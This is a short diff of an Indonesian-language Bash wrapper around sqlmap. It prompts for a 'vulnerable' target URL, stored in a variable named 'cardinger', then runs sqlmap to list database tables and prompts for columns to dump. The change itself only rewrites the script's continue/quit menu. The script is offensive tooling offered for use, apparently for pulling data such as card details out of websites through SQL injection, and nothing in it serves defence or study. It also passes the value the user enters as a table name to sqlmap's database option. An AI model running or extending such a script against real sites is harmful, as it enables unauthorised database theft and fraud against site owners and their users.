@@ -49,15 +49,21 @@ read -p "Masukkan Link atau Web Yang Error (VULN): " cardinger
 		echo "1) Lanjut"
 		echo "2) Keluar (Jika GAGAL)"
 		echo ""
-		read -p "Pilih salah satu pilihan [1-2]: " option
-		case $option in
-			1)
-			echo  ""
-			;;
-			2) exit
-			;;
-		esac
-	done
+		PS3='Silahkan pilih (1-2):'
+options=("Lanjut" "Quit")
+select opt in "${options[@]}"
+do
+    case $opt in
+        "Lanjut")
+	break
+	;;
+	"Quit")
+	exit
+	break
+	;;
+	 *) echo invalid option;
+	esac
+done
 read -p "Ketikkan Table Yang Akan Di Buka: " tabled
 ./sqlmap.py -u $cardinger -D $tabled --tables
 read -p "Ketikkan Column Yang Akan Di Buka: " columed
